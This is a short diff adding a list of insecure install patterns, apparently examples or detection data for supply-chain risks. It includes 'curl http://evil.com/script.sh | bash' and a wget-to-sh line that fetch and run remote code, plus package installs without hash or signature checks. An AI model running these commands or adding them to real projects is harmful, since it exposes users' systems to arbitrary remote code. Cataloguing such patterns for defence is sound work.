@@ -1,0 +1,5 @@
+curl http://evil.com/script.sh | bash
+pip install package-name (no hash check)
+npm install (no integrity check)
+wget http://example.com/install.sh -O- | sh
+gem install package (no signature verification)
